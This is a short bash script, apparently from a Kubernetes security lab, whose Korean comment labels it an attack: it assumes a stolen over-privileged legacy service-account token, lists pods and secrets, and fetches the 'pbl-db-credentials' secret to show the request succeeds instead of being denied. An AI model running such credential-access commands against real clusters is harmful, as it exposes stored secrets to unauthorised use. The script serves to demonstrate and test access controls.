#!/usr/bin/env bash
# [공격] 권한이 과한 계정의 토큰 탈취 → Secret 조회가 200으로 성공 (403이 남지 않음)
source "$(dirname "$0")/common.sh"
use_identity "${LEGACY_SA}"
"${K[@]}" get pods >/dev/null
"${K[@]}" get secrets >/dev/null
"${K[@]}" get secret pbl-db-credentials -o name
